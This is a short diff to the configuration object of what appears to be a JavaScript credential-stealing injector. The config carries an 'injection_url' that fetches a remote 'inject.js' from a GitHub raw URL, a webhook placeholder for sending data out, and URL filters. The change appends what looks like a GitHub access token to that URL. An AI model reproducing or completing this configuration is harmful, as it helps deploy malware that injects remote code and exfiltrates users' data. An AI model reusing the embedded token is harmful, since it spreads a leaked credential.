@@ -19,7 +19,7 @@ var config = {
 
     creator: "%NAME_CREATOR%",
     transfer_link: `%TRANSFER_URL%`,
-    injection_url: "https://raw.githubusercontent.com/Lawxsz/api-test/main/inject.js",
+    injection_url: "https://raw.githubusercontent.com/Lawxsz/api-test/main/inject.js?token=GHSAT0AAAAAACDJB3MBLVY3MHDJMBHPDGKKZDV666A",
     webhook: "%WEBHOOK%",
     Filter: {
         "urls": [
